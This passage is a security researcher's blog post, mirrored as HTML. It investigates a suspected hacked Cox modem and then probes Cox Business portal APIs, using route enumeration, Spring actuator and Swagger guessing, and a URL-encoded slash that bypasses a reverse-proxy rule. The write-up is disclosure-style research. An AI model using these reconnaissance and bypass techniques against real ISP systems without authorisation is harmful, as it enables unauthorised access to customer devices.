<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://samcurry.net/hacking-millions-of-modems">Original</a>
    <h1>Hacking millions of modems and investigating who hacked my modem</h1>
    
    <div id="readability-page-1" class="page"><div>
<p>Two years ago, something very strange happened to me while working from my home network. I was exploiting a blind XXE vulnerability that required an external HTTP server to smuggle out files, so I spun up an AWS box and ran a simple Python webserver to receive the traffic from the vulnerable server:</p>
<pre><code>python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre>
<p>Once the webserver was running, I sent a cURL request from my home computer to make sure that it could receive external HTTP requests:</p>
<pre><code>curl &#34;http://54.156.88.125:8000/test123&#34;
</code></pre>
<p>Just a few seconds later, I saw the following log:</p>
<pre><code>98.161.24.100 - [16:32:12] &#34;GET /test123 HTTP/1.1&#34;
</code></pre>
<p>Perfect, this meant that I was able to receive network traffic on the box. Everything seemed good to go, but right as I switched back to exploiting the vulnerability, something very unexpected appeared in my log file:</p>
<pre><code>98.161.24.100 - [16:32:12] &#34;GET /test123 HTTP/1.1&#34;
159.65.76.209 - [16:32:22] &#34;GET /test123 HTTP/1.1&#34;
</code></pre>
<p>An unknown IP address had replayed the exact same HTTP request just 10 seconds later.</p>
<p>&#34;Wow, that’s seriously weird,&#34; I thought. Somewhere, between my home network and the AWS box, someone had intercepted and replayed my HTTP traffic. This traffic should not be accessible. There is no intermediary between these two systems who should be seeing this. My immediate thought was that my computer had been hacked and that the hacker was actively monitoring my traffic.</p>
<p>To check if the same behavior occured on a different device, I pulled out my iPhone and typed in the URL into Safari. I sent the request, then peaked at my log file:</p>
<pre><code>98.161.24.100 - [16:34:04] &#34;GET /uhhhh HTTP/1.1&#34;
159.65.76.209 - [16:34:16] &#34;GET /uhhhh HTTP/1.1&#34;
</code></pre>
<p>The same unknown IP address had intercepted and replayed both HTTP requests from my computer and iPhone. Somehow, someone was intercepting and replaying the web traffic from likely every single device on my home network.</p>
<p>Panicked, I spun up a new AWS box running Nginx to make sure that the original instance hadn&#39;t been compromised somehow.</p>
<pre><code>sudo service nginx start
tail -f /var/log/nginx/access.log
</code></pre>
<p>I opened the URL once again from my iPhone and saw the exact same logs:</p>
<pre><code>98.161.24.100 - [16:44:04] &#34;GET /whatisgoingon1234 HTTP/1.1&#34;
159.65.76.209 - [16:44:12] &#34;GET /whatisgoingon1234 HTTP/1.1&#34;
</code></pre>
<p>Through what could only be my ISP, modem, or AWS being compromised, someone was intercepting and replaying my HTTP traffic immediately after I&#39;d sent it. To eliminate the absurd idea that AWS had been compromised, I spun up a box on GCP instead and observed the same unknown IP address replaying my HTTP requests. It wasn’t AWS.</p>
<p>The only real option left was that my modem had been hacked, but who was the attacker? I queried the owner of the IP address and found that it belonged to DigitalOcean. Strange. That definitely didn&#39;t belong to my ISP.</p>
<h2 id="who-are-you-1596576209">Who are you, 159.65.76.209?</h2>
<p>To kick off an investigation, I sent the IP address to some friends who worked for threat intelligence companies. They sent me a link to the VirusTotal listing for the IP address which detailed all of the domains which resolved to the IP address over the past few years.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>Out of the last 5 domains that were tied to the IP address, 3 were phishing websites, and 2 were what appeared to be mail servers. The following domains all at one point in time resolved to the DigitalOcean IP address:</p>
<pre><code>regional.adidas.com.py (2019/11/26)
isglatam.online (2019/12/08)
isglatam.tk (2020/11/11)
mx12.limit742921.tokyo (2021/08/08)
mx12.jingoism44769.xyz (2022/04/12)
</code></pre>
<p>Two of the domains associated with the 159.65.76.209 IP address were <code>isglatam.online</code> and <code>isglatam.tk</code>. These were both at one point in time phishing websites for <code>isglatam.com</code>, a South American cybersecurity company.</p>
<p>After visiting the real ISG Latam website, we learned that they are based out of Paraguay and partnered with Crowdstrike, AppGate, Acunetix, DarkTrace, and ForcePoint. From a 10 minute read of everything, it appeared that the people who were intercepting my traffic had tried to phish ISG Latam using the same IP address.</p>
<h2 id="hackers-hacking-hackers">Hackers Hacking Hackers?</h2>
<p>Now this was odd. The IP address, just one year prior, was being used to host phishing infrastructure that targeted a South American cybersecurity company. Assuming that they have been in control of this IP address for 3 years, it would mean that they have used it for at least 2 different phishing campaigns and what appeared to be a C&amp;C server for router malware?</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>Through URLscan, I learned that the <code>isglatam.online</code> and <code>isglatam.tk</code> websites were hosting generic BeEF phishing sites that can historically be seen <a href="https://urlscan.io/result/52459337-0f2d-4b26-859f-4a6f4eafa6dd#transactions">here</a>.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>The signature of the attacker was super interesting, because they were doing a lot of different malicious activities from the same box and apparently had not gotten suspended in over 3 years. It was really hard to piece together their intent with the Adidas, ISG Latam, and modem hacking thing all coming from the same IP address. There was a chance that the IP had rotated between different owners over the years, but it didn&#39;t seem likely as the gaps in between everything were long and it was unlikely that it was immediately reassigned to another malicious party.</p>
<p>Realizing that the infected device was still running, I walked over, unplugged it, and placed it into a cardboard box.</p>
<h2 id="handing-over-evidence">Handing Over Evidence</h2>
<p>The modem that I had been using was the Cox Panoramic Wifi gateway. After learning that it was likely compromised, I went to the local Cox store to show them my device and ask for a new one.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>The one issue with this request was that in order for me to receive a new modem, I had to hand over the old one. Sadly, it wasn&#39;t actually my property — I was only <em>renting</em> it from the ISP. I explained to the employee how I wanted to keep and reverse engineer the device. Their eyes shot up a little bit. They were much less enthusiastic about giving it back to me.</p>
<p>“There’s no way I can keep it?” I asked. “No, we need to take your old one to give you a new one,” the ISP representative said. There was no budging. As much as I wanted to take it apart, dump the firmware, and see if there was any trace of whatever potentially compromised it, I had already passed the device off to the employee. I took my new device and left the store, disappointed that I wasn’t able to do anything more with it.</p>
<p>After setting up the new modem, the previous behavior completely stopped. My traffic was no longer being replayed. There was no &#34;other IP&#34; in the logs. Everything seemed fixed.</p>
<p>With a bit of dissapointment I concluded that the modem I no longer had access to was what had been compromised. Since I’d handed it over to the ISP and replaced the device, there wasn’t anything more that I could investigate besides maybe seeing if my computer had gotten hacked.</p>
<p>I gave up trying to figure it out. At least for the time being.</p>
<h2 id="three-years-later">Three Years Later</h2>
<p>In early 2024, almost three years later, I was on vacation with some friends who also worked in cybersecurity. We were having a conversation over dinner when I explained the story to them. Curious to learn more, they asked me for all of the details and thought it’d be fun to run their own investigation.</p>
<p>The first thing that caught their attention (having worked on more malware analysis a lot more than I had) was the format of the two mail server domains (<code>limit742921.tokyo</code> and <code>jingoism44769.xyz</code>). They pulled the IP address of the <code>mx1</code> subdomain for <code>limit742921.tokyo</code> and then ran a reverse IP search on all domains that had at one point in time pointed to that same IP address. There were over 1,000 domains that all followed the exact same pattern...</p>
<pre><code><span>{</span><span>&#34;rrname&#34;</span><span>:</span><span>&#34;acquire543225.biz.&#34;</span><span>,</span><span>&#34;rrtype&#34;</span><span>:</span><span>&#34;A&#34;</span><span>,</span><span>&#34;rdata&#34;</span><span>:</span><span>&#34;153.127.55.212&#34;</span><span>}</span>
<span>{</span><span>&#34;rrname&#34;</span><span>:</span><span>&#34;battery935904.biz.&#34;</span><span>,</span><span>&#34;rrtype&#34;</span><span>:</span><span>&#34;A&#34;</span><span>,</span><span>&#34;rdata&#34;</span><span>:</span><span>&#34;153.127.55.212&#34;</span><span>}</span>
<span>{</span><span>&#34;rrname&#34;</span><span>:</span><span>&#34;grocery634272.biz.&#34;</span><span>,</span><span>&#34;rrtype&#34;</span><span>:</span><span>&#34;A&#34;</span><span>,</span><span>&#34;rdata&#34;</span><span>:</span><span>&#34;153.127.55.212&#34;</span><span>}</span>
<span>{</span><span>&#34;rrname&#34;</span><span>:</span><span>&#34;seventy688181.biz.&#34;</span><span>,</span><span>&#34;rrtype&#34;</span><span>:</span><span>&#34;A&#34;</span><span>,</span><span>&#34;rdata&#34;</span><span>:</span><span>&#34;153.127.55.212&#34;</span><span>}</span>
</code></pre>
<p>Every single domain that was registered by the discovered IP address used the same naming convention:</p>
<pre><code>[word][6 numbers].[TLD]
</code></pre>
<p>Due to the mass-number of domains and algorithmic structure of the registered address, this appeared to be a domain generation algorithm used by malware operators to rotate the resolving address for the C&amp;C server for the purpose of obfuscation. There was a good chance that the IP address replaying my traffic was a C&amp;C server, and the two domains which I thought were mail servers were actually algorithmically generated pointers to the C&amp;C server.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>Something disappointing was that all of these domains were historical; the last one seen was registered on March 17, 2023. None of the hosts resolved to anything anymore, and we couldn’t seem to identify anything similar being registered to the same IP address.</p>
<p>Given that my new modem was the same model that had been compromised, I was curious if the attacker had found a way back in. From a quick Google search I’d learned that there were no public vulnerabilities for the model of modem that I had (even though it was now 3 years later) so if there was an exploit, they were doing a great job keeping it private.</p>
<p>The other option that seemed more-and-more likely was that they had exploited something outside of a generic router exploit. I was super curious to investigate this and try to brainstorm ways that my device could’ve been compromised.</p>
<h2 id="targeting-rest-apis-using-the-tr-069-protocol">Targeting REST APIs using the TR-069 Protocol</h2>
<p>After getting back home, a close friend had asked if I’d be able to help him move furniture into his new house. What this also meant was helping him transfer over his Cox modem. After connecting his device to the fiber line, I went ahead and called the ISP support and asked if they’d be able to push out an update to allow the device to work in the new location. The agent confirmed they could remotely update the device settings, including changing the WiFi password and viewing connected devices.</p>
<p>The ability of support agents to control devices really interested me, especially since they could update pretty much anything on the device. This extensive access was facilitated by a protocol known as TR-069, implemented in 2004, which allowed ISPs to manage devices within their own network via port 7547. This protocol had already been the subject of a few great DEF CON talks and wasn’t externally exposed, so I wasn’t super interested in bug hunting the protocol itself. What I was interested in, however, were the tools that the support agent was using to manage the device.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2F272GG8M.jpeg&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>To theorycraft a little bit, if I were a hacker who wanted to compromise my modem I&#39;d likely target whatever infrastructure powered the support tools that the agents were using. There was probably some internal website for device management that support agents used, backed by an API that could execute arbitrary commands and change/view administrative settings of customer devices. If I could find some way to access this functionality, it might shed light on how I might have been originally hacked and patch out at least one method for someone to compromise my modem.</p>

<p>The first thing that I decided to look at was the Cox Business portal. This app had a ton of interesting functionality to remotely manage devices, set firewall rules, and monitor network traffic.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>Without actually having a Cox business account myself, I opened the login page for the portal and grabbed a copy of the <code>main.36624ed36fb0ff5b.js</code> file that powered the core functionality of the app. After beautifying it, I parsed out all of the routes and scrolled through them:</p>
<pre><code>/api/cbma/voicemail/services/voicemail/inbox/transcribeMessage/
/api/cbma/profile/services/profile/userroles/
/api/cbma/accountequipment/services/accountequipment/equipments/eligibleRebootDevice
/api/cbma/accountequipment/services/accountequipment/casedetail
/api/cbma/user/identity/services/useridentity/user/verifyContact
/api/cbma/user/identity/services/useridentity/user/contact/validate
...
</code></pre>
<p>There were over 100 different API calls that all had the same base path of <code>/api/cbma/</code>. Since this route seemed to be power most device-related functionality, I thought it was worth investigating if the <code>/api/cbma/</code> endpoint happened to be a reverse proxy to another host. I tested this by sending the following requests:</p>
<h3 id="http-request-that-does-not-start-with-apicbma-returns-301">HTTP request that does not start with api/cbma (returns 301):</h3>
<pre><code><span>GET</span> <span>/api/anything_else/example</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>301</span> <span>Moved</span> <span>Permanently</span>
<span>Location:</span> <span>https://myaccount-business.cox.com/cbma/api/anything_else/example</span>
</code></pre>
<h3 id="http-request-that-does-start-with-apicbma-returns-500">HTTP request that does start with api/cbma (returns 500):</h3>
<pre><code><span>GET</span> <span>/api/cbma/example</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Server:</span> <span>nginx</span>
</code></pre>
<p>From sending the above HTTP requests, we learn that the <code>api/cbma</code> endpoint is an explicit route that is likely a reverse proxy to another host due to the differing behavior around the HTTP response. When we request anything besides <code>api/cbma</code>, it responds with a 302 redirect instead of the 500 internal server error triggered from <code>api/cbma</code>.</p>
<p>This indicated that they were proxying API requests to a dedicated backend while serving the frontend files from the normal system.</p>
<p>Since the API itself had all of the interesting device management functionality, it made sense to focus on everything behind the <code>api/cbma</code> route and see if there was any low hanging fruit like exposed actuators, API documentation, or any directory traversal vulnerabilities that would allow us to escalate permissions.</p>
<p>I went ahead and proxied the registration request for the Cox Business portal which was underneath the <code>api/cbma</code> path:</p>
<pre><code><span>POST</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>User-Agent:</span> <span>Mozilla/5.0</span> <span>(Windows</span> <span>NT</span> <span>10.0</span><span>;</span> <span>Win64;</span> <span>x64;</span> <span>rv:124.0)</span> <span>Gecko/20100101</span> <span>Firefox/124.0</span>
<span>Accept:</span> <span>application/json,</span> <span>text/plain,</span> <span>*/*</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
<span>Ma_transaction_id:</span> <span>a85dc5e0-bd9d-4f0d-b4ae-4e284351e4b4</span>
<span>Content-Length:</span> <span>28</span>
<span>Connection:</span> <span>close</span>

{<span>&#34;email&#34;</span><span>:&#34;test@example.com&#34;</span>}
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Content-Length:</span> <span>126</span>

{
  <span>&#34;message&#34;:</span> <span>&#34;Success&#34;</span>,
  <span>&#34;id&#34;:</span> <span>&#34;test@example.com&#34;</span>
}
</code></pre>
<p>The HTTP request contained a bunch of different authorization headers including what looked to be a general-use API key that was shared between users. The <code>clientid</code> and <code>Cb_session</code> keys looked very custom and indicated there were multiple roles and permissions used in the application.</p>
<p>The HTTP response looked like a generic Spring response, and we could likely quickly confirm that the backend API was running spring by simply changing the POST to GET and observing the response:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>&#34;timestamp&#34;:</span> <span>&#34;2024-04-12T08:57:14.384+00:00&#34;</span>,
  <span>&#34;status&#34;:</span> <span>500</span>,
  <span>&#34;error&#34;:</span> <span>&#34;Internal Server Error&#34;</span>,
  <span>&#34;path&#34;:</span> <span>&#34;/services/profile/validate/v1/email&#34;</span>
}
</code></pre>
<p>Yup, that was definitely a Spring error. Since we could confirm that the reverse proxy was running Spring, I decided to look for actuators and exposed API docs.</p>
<p>I went ahead and tried to guess the actuator route:</p>
<pre><code><span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/actuator/</span>
</code></pre>
<p>Shame, no easy actuators. I then checked for accessible API documentation:</p>
<pre><code><span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/index.html</span>
<span>✅</span> <span>GET</span> <span>/api/cbma/userauthorization/swagger-ui/index.html</span>
</code></pre>
<p>We had a hit! There was a swagger landing page at <code>/api/cbma/profile/swagger-ui/index.html</code>. I loaded the page expecting to see API routes, however...</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>Totally empty. Something was causing the page not to load. I checked the network traffic and there seemed to be in an infinite redirect loop when attempting to load any static resource:</p>
<pre><code><span>GET</span> <span>/api/cbma/ticket/services/swagger-ui/swagger-initializer.js</span> <span>HTTP/1.1</span>
<span>Location:</span> <span>/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js</span>
<span>...</span>
<span>GET</span> <span>/cbma/api/cbma/ticket/services/swagger-ui/swagger-initializer.js</span> <span>HTTP/1.1</span>
<span>Location:</span> <span>/cbma/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js</span>
</code></pre>
<p>It seemed that requests to load static resources for the page (<code>.png</code>, <code>.js</code>, <code>.css</code>) were all being routed through the base URI instead of the reverse proxy API host. What this meant was there was probably a proxy rule for static assets, so I changed the extension to test this:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.anythingElse</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Server:</span> <span>nginx</span>
</code></pre>
<p>After confirming that the <code>.js</code> extension was triggering the routing of the request to the original host, we now needed to find a way to load the resource from the API reverse proxy but without hitting the rule condition which switched routing for static files. The simplest way to do this, since the request was being proxied, was to check if there was any character that we could add which would “drop off” in transit.</p>
<h3 id="loading-static-resources-from-reverse-proxy-api">Loading Static Resources from Reverse Proxy API</h3>
<p>To fuzz this, I simply used Burp’s intruder to enumerate from <code>%00</code> to <code>%FF</code> at the end of the URL. After about 30 seconds of running, we had a 200 OK by appending the URL encoded <code>/</code> symbol:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js%2f</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP</span>/<span>2</span> <span>200</span> <span>OK</span>
<span>Content</span>-<span>Type</span>: application/javascript

<span>window</span>.<span>onload</span> = <span>function</span>(<span></span>) { <span>window</span>.<span>ui</span> = <span>SwaggerUIBundle</span>({ <span>url</span>: <span>&#34;https://petstore.swagger.io/v2/swagger.json&#34;</span>, <span>dom_id</span>: <span>&#39;#swagger-ui&#39;</span>, <span>deepLinking</span>: <span>true</span>, <span>presets</span>: [ <span>SwaggerUIBundle</span>.<span>presets</span>.<span>apis</span>, <span>SwaggerUIStandalonePreset</span> ], <span>plugins</span>: [ <span>SwaggerUIBundle</span>.<span>plugins</span>.<span>DownloadUrl</span> ], <span>layout</span>: <span>&#34;StandaloneLayout&#34;</span> , <span>&#34;configUrl&#34;</span> : <span>&#34;/services/v3/api-docs/swagger-config&#34;</span>, <span>&#34;validatorUrl&#34;</span> : <span>&#34;&#34;</span> }); 
</code></pre>
<p>By appending the <code>%2f</code> to the <code>.js</code> extension, we could load the JS files. I wrote a rule to append <code>%2f</code> to all static resources using Burp’s match-and-replace then reloaded the page.</p>
